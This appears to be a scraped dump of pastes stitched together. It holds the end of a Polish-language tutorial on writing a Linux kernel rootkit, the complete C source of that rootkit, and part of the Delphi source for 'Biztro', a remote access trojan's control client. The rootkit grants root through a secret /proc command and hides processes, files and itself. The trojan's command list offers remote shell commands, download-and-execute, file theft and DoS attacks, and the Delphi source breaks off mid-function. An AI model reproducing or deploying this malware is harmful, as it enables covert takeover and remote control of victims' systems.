\texttt{module\_init} i \texttt{module\_exit} (plik nagłówkowy \texttt{linux/init.h}).
Prototypy jak w przykładzie:
\begin{minted}[frame=lines,framesep=2mm]{c}
#include <linux/init.h>
#include <linux/module.h>

MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_AUTHOR(""Arkadiusz Hiler<ivyl@sigillum.cc>"");
MODULE_AUTHOR(""Michal Winiarski<t3hkn0r@gmail.com>"");

static int __init rootkit_init(void) {
	
	return 0;
}

static void __exit rootkit_exit(void) {

}

module_init(rootkit_init);
module_exit(rootkit_exit);
\end{minted}

\texttt{\_\_init} oraz \texttt{\_\_exit} to makra oznaczające funkcje
używane jedynie przy ładowaniu/zwalnianiu modułu, dzięki czemu może zwolnić
zajmowane przez nie zasoby.

Znaczenie makr \texttt{MODULE\_AUTHOR} oraz \texttt{MODULE\_LICENSE}
(\texttt{linux/module.h}) jest oczywiste.

Na szczególną uwagę zasługuje użycie modyfikatora \texttt{static}. Gwarantuje
on nam, że funkcja nie jest widoczna na zewnątrz naszego kodu (żadne symbole
nie są eksportowane). Postaramy się używać go przy każdej definicji w celu
lepszego ukrycia modułu jądra.

\subsection{Wpis w /proc}
Interesujące nas funkcje znajdują się w pliku nagłówkowym
\texttt{linux/proc\_fs.h}.
\begin{minted}{c}
struct proc_dir_entry *create_proc_entry(const char *name,
        mode_t mode, struct proc_dir_entry *parent);
\end{minted}
Pierwszy parametr to zwyczajnie nazwa, drugi to tryb dostępu, najłatwiej podać
ósemkowo. Ostatnim parametrem jest rodzic w procfs, gdy podamy \texttt{NULL},
wpis tworzony jest w procfs root.

Należy pamiętać o sprawdzaniu czy zwracana jest poprawna struktura (nie
\texttt{NULL}). Przy wyładowywaniu modułu należy pamiętać o usunięciu wpisu:
\begin{minted}{c}
remove_proc_entry(const char *name, struct proc_dir_entry *parent);
\end{minted}

Struktura \texttt{proc\_dir\_entry} zwracana przez powyższą funkcję zawiera
m.in. wskaźniki na funkcje używane przy odczycie/zapisie do pliku.
Interesujące nas pola to \texttt{read\_proc} oraz
\texttt{write\_proc}\cite{lkmpg}. Prototypy funkcji na które wskazują:

\begin{minted}{c}
int read(char *buffer, char **buffer_location, off_t off,
        int count, int *eof, void *data);

int write(struct file *file, const char __user *buff,
        unsigned long count, void *data);
\end{minted}

\subsubsection{Read}
Pierwsza funkcja zwrotna jest wywoływana gdy odczytujemy z pliku. Pierwszym
paramterem jest bufor, do którego mamy zapisywać, drugi to jego położenie w
pamięci, można użyć np. do zaalokowania własnego bufora, trzeci to offset, od
którego chcemy zacząć czytać, czwarty to rozmiar buffora, który dostaliśmy,
piąty wskazuje eof (po wpisaniu 1 pod adres), szóty to wkaźnik na dodatkowe
dane. Funkcja zwraca liczbę wypisanych znaków.


Przykładowa bezpieczna implementacja przy założeniu, że mamy zaalokowany
odpowiednio duży \texttt{char[] module\_status}:
\begin{minted}[frame=lines,framesep=2mm]{c}
int rtkit_read(char *buffer, char **buffer_location,
        off_t off, int count, int *eof, void *data) {
	int size;
	
	//build module_status
	
	size = strlen(module_status);

	if (off >= size) return 0;
  
	if (count >= size-off) {
		memcpy(buffer, module_status+off, size-off);
	} else {
		memcpy(buffer, module_status+off, count);
	}
  
	return size-off;
}
\end{minted}
Podana wyżej implementacja gwarantuje nam nieprzekroczenie obszaru bufora,
zakończneie odczytu (zwrócenie zero przy próbie odczytu poza obszarem, nie używamy eof)
oraz poprawną obsługę programów do czytania stronami (less, more) dzięki obsłudze offsetu.

\subsubsection{Write}
Parametrami, które nas interesują jest \texttt{buff}, czyli bufor wejściowy
oraz \texttt{count} czyli rozmiar danych przekazanych w buforze. Pozostałe
parametry to struktura file opisująca plik do którego piszemy oraz wskaźnik na
dodatkowe dane. Funkcja zwraca liczbę przetworzonych znaków.

Wystarczy porównywać zawartość bufora z komendą i wyciągnąć ewentualne
dodatkowe informacje. Należy pamiętać o rozmiarze bufora i liczbie znaków.
\begin{minted}[frame=lines,framesep=2mm]{c}
int rtkit_write(struct file *file, const char __user *buff,
    unsigned long count, void *data) {
	if (!strncmp(buff, ""secreet pass"", MIN(11, count))) { }
	
	return count;
}
\end{minted}

Powyżej użyte zostało makro:
\begin{minted}[frame=lines,framesep=2mm]{c}
#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
       typeof (b) _b = (b); \
     _a < _b ? _a : _b; })
\end{minted}     

\subsubsection{Podniesienie uprawnień}
W pliku nagłówkowym \texttt{linux/cred.h} znajduje się funkcje które pozwalają
na pobranie uprawnień aktualnie wykonywanego procesu oraz ich ponowne
zapisanie. \texttt{prepare\_creds()} zwraca nam strukturę cred z informacjami
o bieżacym procesie i jego uprawnienaich, zaś \texttt{commit\_creds(struct
cred*)} ustawia procesowi nowe wartości na podstawie podanej struktury.
Interesują nas pola uid, gid, euid oraz egid (user id, group id oraz ich
efektywne wersje). W pobranej strukturze należy zmienić wartość tych pól na 0
(root) po czym zatwierdzić nowe ustawienia.
\begin{minted}[frame=lines,framesep=2mm]{c}
struct cred *credentials = prepare_creds();
credentials->uid = credentials->euid = 0;
credentials->gid = credentials->egid = 0;
commit_creds(credentials);
\end{minted}
Wewnątrz funkcji write aktualnie wykonywnem procesem będzie proces, który
pisał do pliku w \texttt{/proc}, więc można tam dokonać zmiany.

\subsubsection{Uwagi}
Łatwo złożyć powyższe informacje w całość, która po wydaniu odpowiedniego
rozkazu do wpisu w \texttt{/proc} daje nam uprawnienia roota. Obie funkcje
(read i wrtie) są w zasadzie gotowe do przypisania do odpowienich pól
struktury.

Do budowy odpowiedzi jak i sprawdzania wejścia możemy użyć funkcji z
\texttt{linux/string.h}. Znajdziemy tam klasyczne funkcje
porównania(\texttt{strcmp}, \texttt{strncmp}) budowy łańcuchów
(\texttt{sprintf}) czy kopiowania.

\subsection{Wydawanie rozkazów poprzez wpis}
\begin{minted}[frame=lines,framesep=2mm]{python}
#!/usr/bin/env python
import sys
import os

def order(command):
    f = open(""/proc/rtkit"", ""w"")
    f.write(command)
    f.close()

if len(sys.argv) > 1:
    order(sys.argv[1])

if len(sys.argv) > 2:
    os.execl(sys.argv[2], """")
\end{minted}
Powyższy program zapisuje pierwszy przekazany argument do wpisu w
\texttt{/proc}. Jeżeli podany jest drugi argument, to uruchamiany jest
wskazywany przezeń program (np. po dostaniu roota odpalamy powłokę bash).


\subsection{Ukrycie wpisów w \texttt{/proc}}
\subsubsection{Użyteczność}
Ukrywanie plików w \texttt{/proc} może posłużyć do ukrycia wpisu stworzonego
przez nas jak i ukrycia procesów w systemie. Programy pokroju \texttt{ps} i
\texttt{top} listują katalogi w \texttt{/proc} reprezentujące procesy. Ukrycie
tych katalogów skutkuje ukryciem procesów.

\subsubsection{Wyciągnięcie \texttt{file\_operations}}
Zmian tych można dokonać poprzez zastąpienie używanej funkcji
\texttt{readdir}, która zamienia funkcję \texttt{filldir} przekazywaną do
oryginału. Wskaźnik do funkcji \texttt{readdir} znajduje się w strukturze
\texttt{file\_operations}. Interesuje nas struktura dla \texttt{/proc}.
Wskaźnik na \texttt{file\_operations} można znaleść w strukturze
\texttt{proc\_dir\_entry}. Nasz nowo utworzony plik w \texttt{/proc} zawiera
wskaźnik na rodzica - w tym wypadku sam \texttt{/proc}. Pole
\texttt{proc\_fops} zawiera interesującą nas strukturę.

\mint{c}|proc_rtkit->parent->proc_fops|

\subsubsection{Własne \texttt{readdir} i \texttt{filldir}}
Własna wersja \texttt{readdir} ma za zadanie jedynie opakować oryginalne
\texttt{filldir} w naszą własną wersję. Uzywamy do tego globalnej statycznej
zmiennej. \texttt{filldir} natomiast ma zwracać 0 jeśli chemy ukryć wpis lub
też wywoływać oryginał. Pozwolimy pominąć sobie opis prototypów funkcji i
przejść do implementacji:
\begin{minted}[frame=lines,framesep=2mm]{c}
int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir) {
	proc_filldir_orig = filldir; //some static variable
	return proc_readdir_orig(filp, dirent, proc_filldir_new);
}

int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset,
u64 ino, unsigned d_type) {
	if (!strcmp(name, ""rtkit"")) return 0;
	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}
\end{minted}
Użycie globalnej zmiennej nie powoduje kłopotów w razie przypadkowego
wywłaszczenia. \texttt{filldir} jest zawsze takie samo, nie ma niestety innego
sposobu na jego wyciągniecie niż zrobieni tego w ciele \texttt{readdir}.

\subsubsection{Zmiana trybu dostepu do strony w pamięci}
Niestety bezpośrednia podmiana wskaźnika w strukturze nie jest możliwa z dwóch
powodów. Po pierwsze, wskaźnik jest typu \texttt{const} i potrzebne jest
odpowiednie rzutowanie, po drugie ze wzgledu na oznaczenie strony pamięci, na
której znajduje się struktura \texttt{file\_operations} jako tylko do odczytu.
Kończy się to błędem typu Kernel Oops z komunikatem ,,unable to handle kernel
paging'' istnieje kilka metod zmiany trybu strony, jednak większość ma pewne
dodatkowe ograniczenia (np. nie zmienianie trybu strony znajdującej się w
obszarze .rodata). W kernelu w wersji 2.6.26 lub wyższej eksportowana jest
metoda o prototypie\cite{stovf1}:
\mint{c}|pte_t *lookup_address(unsigned long addr, unsigned int *level);|

Wyciąga ona struturę \texttt{pte\_t} zawierającą pole \texttt{pte} pozwalające
na zmianę trybu dostępu (maska bitowa). Interesuje nas ustawienie
\texttt{\_PAGE\_RW} po czym posprzątanie po sobie.

Wymaga to od nas rzutowania wskaźnika na struturę na typ \texttt{unsigned
long}. Ze względu na potrzebę użycia tego w kilku miejscach stwórzmy sobie
metody pomocnicze:
\begin{minted}[frame=lines,framesep=2mm]{c}
void set_addr_rw(void *addr) {
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

void set_addr_ro(void *addr) {
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}
\end{minted}
Przez wkaźnik przekazywany jako drugi parametr zwracany jest poziom strony,
który ignorujemy. Po wykonaniu \texttt{set\_addr\_rw(proc\_fops)} można
dokonać podmiany, po czym należy wrócić do trybu tylko do odczytu:
\begin{minted}[frame=lines,framesep=2mm]{c}
set_addr_rw(proc_fops);
proc_fops->readdir = proc_readdir_new;
set_addr_ro(proc_fops);
\end{minted}
Pamiętajmy też o zapamiętaniu oryginału, by móc przywrócić stan pierwotny przy
wyładowywaniu modułu.

\subsection{Ukrycie wpisów w systemie plików}
\subsubsection{Wyciągnięcie \texttt{file\_operations}}
Wszystko odbywa się analogicznie do ukrywania wpisów w \texttt{/proc}. Jedynej
trudności nastręcza wyciągniecie struktury \texttt{file\_operations}. Systemy
plików rejestrowane są w podsystemie VFS. Stamtąd można wyciągnąć jedynie
wkaźnik na funkcję używaną do montowania dla systemu plików o konkretnej
nazwie. Najlepszą i najbezpieczniejszą metodą (gwarantującą podmianą readdir
dla używanego systemu plików) jest użycie funkcji:
\mint{c}|struct file *filp_open (const char *filename, int flags, int mode);|
Jako flags podajemy \texttt{O\_RDONLY}, mode jest istotny tylko przy użyciu
flagi \texttt{O\_CREAT}, więc podajemy cokolwiek. Najlepiej otworzyć folder,
którego istnienia zawsze jesteśmy pewni, np. \texttt{/etc}. Struktura file
zawiera pole f\_op będące wskaźnikiem na \texttt{file\_operations} (pamiętać o
rzutowniu, jest typu \texttt{const}, oraz o zmianie trybu strony). Po czym
plik należy zamknąć
\mint{c}|int filp_close(struct file *filp, fl_owner_t id);|
ID dotyczy wątku zarządzającego, podajemy \texttt{NULL} Funkcje te opisane są
w pliku nagłówkowym \texttt{linux/fs.h}.

\subsection{Ukrycie modułu}
Podstawowym zabiegiem jest wcześniej wspomniane używanie modyfikatora
\texttt{static}. Dzięki temu unikniemy pojawienia się wpisów w
\texttt{/proc/kallsyms}. Dodatkowo należy usunać moduł z listy modułów (nie
będzie widoczny przez lsmod) i zadbać o wyrejestrowanie obiektów
\texttt{kobject}, które mają swoją reprezentację w \texttt{/sys}. Posłużymy
się metodami \texttt{list\_del(struct list\_head*)} oraz
\texttt{kobject\_del(struct kobject*)}.

\begin{minted}[frame=lines,framesep=2mm]{c}
list_del(&THIS_MODULE->list);
kobject_del(&THIS_MODULE->mkobj.kobj);
list_del(&THIS_MODULE->mkobj.kobj.entry);
\end{minted}
\texttt{THIS\_MODULE} to makro dające dostęp do struktury opisjącej bieżący
moduł.

Można zapamiętać poprzedniki (pole \texttt{prev}) w celu powrotnego dodania na
rozkaz (umożliwienie wyładowania modułu).

\section{Podsumowanie}
Z odrobiną własnej inwencji można złożyć powyższe w całość, zaimplementować
rozkaz ukrywania PIDów, itd. Poniżej zamieściliśmy listnig kodu w pełni
funkcjonującego rootkita.

\section{Pełen kod}
\inputminted[linenos,fontsize=\footnotesize]{c}{../rt.c}

\begin{thebibliography}{9}
\bibitem{ldd3}
  Jonathan Corbet, Alessandro Rubini, and Greg Kroah-Hartman
  \emph{Linux Device Drivers}.
  O'Reilly,
  3rd Edition,
  2005.

\bibitem{stovf1}
  Corey Henderson
  \emph{Linux Kernel: System call hooking example}, Stackoverflow discussion.
  http://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example
  
\bibitem{lkmpg}
  Peter Jay Salzman, Michael Burian, and Ori Pomerantz
  \emph{The Linux Kernel Module Programming Guide}.
  http://linux.die.net/lkmpg/
\end{thebibliography}
\end{document}"
B0v10Ntq,rt.c,FlyFar,C,Wednesday 7th of June 2023 05:40:27 AM CDT,"#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })


#define MAX_PIDS 50

MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_AUTHOR(""Arkadiusz Hiler<ivyl@sigillum.cc>"");
MODULE_AUTHOR(""Michal Winiarski<t3hkn0r@gmail.com>"");

//STATIC VARIABLES SECTION
//we don't want to have it visible in kallsyms and have access to it all the time
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_rtkit;

static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *, void *, filldir_t);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;

static char module_hidden = 0;

static char module_status[1024];

//MODULE HELPERS
void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}
 
void module_show(void)
{
	int result;
	if (!module_hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, ""rt"");
	module_hidden = !module_hidden;
}

//PAGE RW HELPERS
static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}

//CALLBACK SECTION
static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	for (i=0; i < current_pid; i++) {
		if (!strcmp(name, pids_to_hide[i])) return 0;
	}
	if (!strcmp(name, ""rtkit"")) return 0;
	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
	proc_filldir_orig = filldir;
	return proc_readdir_orig(filp, dirent, proc_filldir_new);
}

static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	if (hide_files && (!strncmp(name, ""__rt"", 4) || !strncmp(name, ""10-__rt"", 7))) return 0;
	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
	fs_filldir_orig = filldir;
	return fs_readdir_orig(filp, dirent, fs_filldir_new);
}

static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
{
	int size;
	
	sprintf(module_status, 
""RTKIT\n\
DESC:\n\
  hides files prefixed with __rt or 10-__rt and gives root\n\
CMNDS:\n\
  mypenislong - uid and gid 0 for writing process\n\
  hpXXXX - hides proc with id XXXX\n\
  up - unhides last process\n\
  thf - toogles file hiding\n\
  mh - module hide\n\
  ms - module show\n\
STATUS\n\
  fshide: %d\n\
  pids_hidden: %d\n\
  module_hidden: %d\n"", hide_files, current_pid, module_hidden);

	size = strlen(module_status);

	if (off >= size) return 0;
  
	if (count >= size-off) {
		memcpy(buffer, module_status+off, size-off);
	} else {
		memcpy(buffer, module_status+off, count);
	}
  
	return size-off;
}

static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
{
	if (!strncmp(buff, ""mypenislong"", MIN(11, count))) { //changes to root
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->euid = 0;
		credentials->gid = credentials->egid = 0;
		commit_creds(credentials);
	} else if (!strncmp(buff, ""hp"", MIN(2, count))) {//upXXXXXX hides process with given id
		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
	} else if (!strncmp(buff, ""up"", MIN(2, count))) {//unhides last hidden process
		if (current_pid > 0) current_pid--;
	} else if (!strncmp(buff, ""thf"", MIN(3, count))) {//toggles hide files in fs
		hide_files = !hide_files;
	} else if (!strncmp(buff, ""mh"", MIN(2, count))) {//module hide
		module_hide();
	} else if (!strncmp(buff, ""ms"", MIN(2, count))) {//module hide
		module_show();
	}
	
        return count;
}

//INITIALIZING/CLEANING HELPER METHODS SECTION
static void procfs_clean(void)
{
	if (proc_rtkit != NULL) {
		remove_proc_entry(""rtkit"", NULL);
		proc_rtkit = NULL;
	}
	if (proc_fops != NULL && proc_readdir_orig != NULL) {
		set_addr_rw(proc_fops);
		proc_fops->readdir = proc_readdir_orig;
		set_addr_ro(proc_fops);
	}
}
	
static void fs_clean(void)
{
	if (fs_fops != NULL && fs_readdir_orig != NULL) {
		set_addr_rw(fs_fops);
		fs_fops->readdir = fs_readdir_orig;
		set_addr_ro(fs_fops);
	}
}

static int __init procfs_init(void)
{
	//new entry in proc root with 666 rights
	proc_rtkit = create_proc_entry(""rtkit"", 0666, NULL);
	if (proc_rtkit == NULL) return 0;
	proc_root = proc_rtkit->parent;
	if (proc_root == NULL || strcmp(proc_root->name, ""/proc"") != 0) {
		return 0;
	}
	proc_rtkit->read_proc = rtkit_read;
	proc_rtkit->write_proc = rtkit_write;
	
	//substitute proc readdir to our wersion (using page mode change)
	proc_fops = ((struct file_operations *) proc_root->proc_fops);
	proc_readdir_orig = proc_fops->readdir;
	set_addr_rw(proc_fops);
	proc_fops->readdir = proc_readdir_new;
	set_addr_ro(proc_fops);
	
	return 1;
}

static int __init fs_init(void)
{
	struct file *etc_filp;
	
	//get file_operations of /etc
	etc_filp = filp_open(""/etc"", O_RDONLY, 0);
	if (etc_filp == NULL) return 0;
	fs_fops = (struct file_operations *) etc_filp->f_op;
	filp_close(etc_filp, NULL);
	
	//substitute readdir of fs on which /etc is
	fs_readdir_orig = fs_fops->readdir;
	set_addr_rw(fs_fops);
	fs_fops->readdir = fs_readdir_new;
	set_addr_ro(fs_fops);
	
	return 1;
}


//MODULE INIT/EXIT
static int __init rootkit_init(void)
{
	if (!procfs_init() || !fs_init()) {
		procfs_clean();
		fs_clean();
		return 1;
	}
	module_hide();
	
	return 0;
}

static void __exit rootkit_exit(void)
{
	procfs_clean();
	fs_clean();
}

module_init(rootkit_init);
module_exit(rootkit_exit);"
3tMSCimK,bcc.dpr,FlyFar,Delphi,Wednesday 7th of June 2023 05:34:40 AM CDT,"   program bcc;

   uses
     Forms,
     Splash_unit in 'Splash_unit.pas';

   {$R *.res}

   begin

     Application.CreateForm(TSplash, Splash);
     Application.Run;

   end."
Zv2SLRuH,Splash_unit.pas,FlyFar,Pascal,Wednesday 7th of June 2023 05:34:07 AM CDT,"   unit Splash_unit;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, jpeg, ExtCtrls, StdCtrls,URLMON,WinInet,SHELLAPI, ComCtrls, Buttons,Winsock;

   type
     TSplash = class(TForm)
       Image1: TImage;
       Image2: TImage;
       Image3: TImage;
       GroupBox1: TGroupBox;
       Memo1: TMemo;
       ProgressBar1: TProgressBar;
       Label3: TLabel;
       Label2: TLabel;
       SpeedButton2: TSpeedButton;
       Image4: TImage;
       Image5: TImage;
       Image7: TImage;
       Image6: TImage;
       GroupBox2: TGroupBox;
       Memo2: TMemo;
       Edit1: TEdit;
       GroupBox3: TGroupBox;
       Image9: TImage;
       GroupBox4: TGroupBox;
       Edit2: TEdit;
       Label4: TLabel;
       SpeedButton3: TSpeedButton;
       SpeedButton4: TSpeedButton;
       SpeedButton5: TSpeedButton;
       Label5: TLabel;
       SpeedButton6: TSpeedButton;
       Memo3: TMemo;
       GroupBox5: TGroupBox;
       ProgressBar2: TProgressBar;
       Label1: TLabel;
       ComboBox1: TComboBox;
       SpeedButton7: TSpeedButton;
       Image8: TImage;
       Edit3: TEdit;
       ProgressBar3: TProgressBar;
       SpeedButton8: TSpeedButton;
       SpeedButton11: TSpeedButton;
       SpeedButton1: TSpeedButton;
       GroupBox6: TGroupBox;
       Label6: TLabel;
       Label7: TLabel;
       Label8: TLabel;
       SpeedButton10: TSpeedButton;
       SpeedButton9: TSpeedButton;
       SpeedButton13: TSpeedButton;
       Image10: TImage;
         procedure Pro;
       procedure SpeedButton2Click(Sender: TObject);
       procedure Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure SpeedButton1MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Memo2MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure GroupBox2MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure FormMouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Image6MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure SpeedButton3Click(Sender: TObject);
       procedure SpeedButton5Click(Sender: TObject);
       procedure SpeedButton6Click(Sender: TObject);
       procedure SpeedButton4Click(Sender: TObject);
       procedure Image8Click(Sender: TObject);
       procedure ComboBox1Change(Sender: TObject);
       procedure Edit3Change(Sender: TObject);
       procedure SpeedButton7Click(Sender: TObject);
       procedure BioChange(const m:string;const e:integer);
       procedure error(const m:byte);
       procedure Upload(const x:string);
       procedure Upload2(const x:string);
       procedure SendComm(m:string);
       procedure Disconnect;
       procedure Download(const x1:string);
       procedure Local(const m:string;const e:integer);
       procedure SendPlugin(const x:string);
       procedure SpeedButton1Click(Sender: TObject);
       procedure SpeedButton12Click(Sender: TObject);
       procedure SpeedButton9Click(Sender: TObject);
       procedure Sund;
       procedure ConProg;
       procedure SpeedButton11Click(Sender: TObject);
       procedure SpeedButton10Click(Sender: TObject);
       procedure SpeedButton8Click(Sender: TObject);
       procedure Edit1KeyDown(Sender: TObject; var Key: Word;
         Shift: TShiftState);
       procedure SpeedButton13Click(Sender: TObject);
       procedure FormClose(Sender: TObject; var Action: TCloseAction);
       procedure Image9Click(Sender: TObject);
       procedure FormCreate(Sender: TObject);
       procedure Edit2KeyDown(Sender: TObject; var Key: Word;
         Shift: TShiftState);
     private
       { Private declarations }

      public

     public
       { Public declarations }

     end;
       const
     Made_By = 'Biztro Control Client by Byt3Cr0w/GEDZAC - Project Finish Date: 26/11/2004 - www.gedzac.tk';
     SP = #13#10;
     COMLIST = 'Command List:'+sp+sp+'Command name: Remote cmd'+sp+'Use: /[windows cmd command]'+sp+'Biztro will executed your commands in the windows cmd of the infected machine and send to you the result of the executed command.'+sp+'Example: /DIR C:\'+sp+sp+'Command name: Upload'+sp+'Use: Upload [url/localhost]'+sp+'With this command the remote machine downloads a file from an URL or your computer.'+sp+'Example1: Upload http://www.somepage.com/file.exe'+sp+'Example2: Upload localhost/C:\file.exe'+sp+sp+'Command name: UploadEx'+sp+'Use: Ex-Upload [url/localhost]'+sp+'With this command the remote machine downloads a file from an URL or your computer and execute it.'+sp+'Example1: Ex-Upload http://www.somepage.com/file.exe'+sp+'Example2: ExUpload localhost/C:\file.exe'+sp+sp+
               'Command name: Download'+sp+'Use: Download [RemoteFile]'+sp+'With this command you can download a file from the remote machine.'+sp+'Example: Download C:\remotefile.exe'+sp+sp+'Command name: Dos'+sp+'Use: Dos [URL]'+sp+'With this command the remote machine make a D.O.S attack to an specific URL.'+sp+'Example: Dos www.url.com'+sp+sp+'Comman name: Plugin'+sp+'Use: Plugin [url of the DLL]'+sp+'With this command you will send and install a plugin for Biztro in the remote machine (Must be a valid Dynamic Library)'+sp+
               'Example: Plugin www.biztroplugins.com/plugin.dll';
   var
     Splash: TSplash;
     ID:dword;
     ToLoad,j,rip:string;
     control1,control2:integer;
     Zock : Tsocket;
     e,e1,e2,x,me:integer;
     shutdownx,cp,NowCon:boolean;
   implementation

   {$R *.dfm}


   procedure Msgx(const m:string);
   begin
   MessageBox(0,Pchar(m),'Biztro Control Client - Gedzac Labs 2004',32);
   end;

   procedure TSplash.Disconnect;
   begin
   try closesocket(Zock); except end;
   Label5.Caption := 'Status: Disconnected';
   GroupBox3.Hide;
   GroupBox3.Height := 361;
   Image9.Show;
   Memo3.Text := Memo3.Text + 'Now Disconnected'+sp;
   Splash.Update;
   Edit2.Text := '';
   e:=0;e1:=0;e2:=0;
   NowCon := false;
   end;

   procedure Tsplash.error(const m:byte);
   begin
   case m of
   1: begin
   MsgX('Error: Connection Failed'+sp+'Possible reasons:'+sp+' -The remote computer is not connected to internet.'+sp+' -The remote computer is behind a firewall.'+sp+' -The remote computer is not infected by Biztro.');
   Disconnect;
   end;
   2: begin
   Memo2.Text := Memo2.Text + comlist;
   Edit1.Clear;
   end;
   end;
   end;


   procedure Sendx(const ss:string);
   begin
   Send(Zock,Pointer(ss)^,Length(ss),0);
   end;

   procedure sendf(const m:string);
      var   vz:array [0..1023] of Char;
       ozz,fw:integer;
       iam:file;
       z,afuera,fat:string;
      begin
      z := m;
       Delete(z,1,5);
   z := Copy(z,1, Pos('HTTP/1',z)-2);
      if not fileexists(z) then
      begin
   writeln('mno');
      end;
      fw := FileOpen(z,0);
      fat := floattostr(getfilesize(fw,nil));
      fileclose(fw);
      AssignFile(iam,z);
            filemode:=0;
           try reset(iam,1); except end;
       afuera := 'HTTP/1.1 200 OK' + SP
           + 'Accept-Ranges: bytes' + SP
           + 'Content-Length: '+fat + sp
           + 'Keep-Alive: timeout=15, max=100' + sp
           + 'Connection: Keep-Alive' + sp
           + 'Content-Type: application/x-msdownload' + sp + sp;
              Send( x, Addr(afuera[1])^, Length(afuera), 0 );
       repeat
         BlockRead(iam,vz[0],SizeOf(vz),ozz);
         if ozz<=0 then break; if send(x,vz[0],ozz,0)<=0 then break;
       until ozz<>1024;
       closefile(iam);
       end;

   function Wakesock: Boolean;
   var
     anne: TWSAData;
   begin
     Result :=  WSAStartup( $101, anne ) = 0
   end;


   function LoadService(casa:integer): Integer;
   var direc: TSockAddrIn;
   begin
     Result := Socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );
     if Result = INVALID_SOCKET then
       Exit;
     with direc do begin
       sin_family := AF_INET;
       sin_port := htons(casa);
       sin_addr.S_addr := 0;
     end;

     if Bind( Result, direc, SizeOf(direc) ) <> 0 then begin
       Result := INVALID_SOCKET;
       Exit;
     end;

     if Listen(Result,5) <> 0 then
       Result := INVALID_SOCKET;
   end;

   procedure bye(Sock:Integer);
   begin
     ShutDown(Sock,2);
     CloseSocket(Sock);
   end;

   procedure RemoteModule(me:integer);
   var
     Data: array[ 0..8191 ] of Char;
     w,z: Pointer;
     l: Char;
     current: Integer;
       begin
     x := Accept(me, nil, nil );
     repeat

       current := Recv(x, Data, SizeOf(Data), 0 );
       if current = 0 then
         current := SOCKET_ERROR
       else
       begin
         w := @Data;
         z := Pointer(Integer(@Data) + current);
         l := #0;
         while Integer(w) < Integer(z) do begin
           if (l = #13) and (Char(w^) = #10 ) then begin
             Inc( Integer(w));
             Continue;
           end;
           l := Char(w^);
           if l = #13 then
           begin
                                    TRY
       if Pos('GET',j) > 0 then sendf(j);
                                except end;
           j := '';
           end else
             j := j + l;
           Inc(Integer(w));
         end;
       end;
     until current = SOCKET_ERROR;
     bye(x);
   end;

   procedure Server;
   begin
     if not Wakesock then exit;
     me := LoadService(2777);
     if me = INVALID_SOCKET then exit;
     repeat
   RemoteModule(me);
     until shutdownx;
     bye(me);
     WSACleanUp;
    end;

   function packet(pack:string):boolean;
   var bag :array [0..2048] of char;
   begin
     zeroMemory(@bag[0],SizeOf(bag));
     if(Recv(Zock,bag,SizeOf(bag),0)=SOCKET_ERROR)or(Copy(bag,1,Length(pack))<>pack) then
     result:=False else Result:=True;
     end;

     function Connectx(m:string):boolean;
     var direcx: TSockAddr;
        InitDllSock  : TWSAData;
   begin
    WSAStartup( $101, InitDllSock );
     Zock := Socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );
     if Zock = INVALID_SOCKET then exit;
     with direcx do begin
       sin_family := AF_INET;
       sin_port := htons(666);
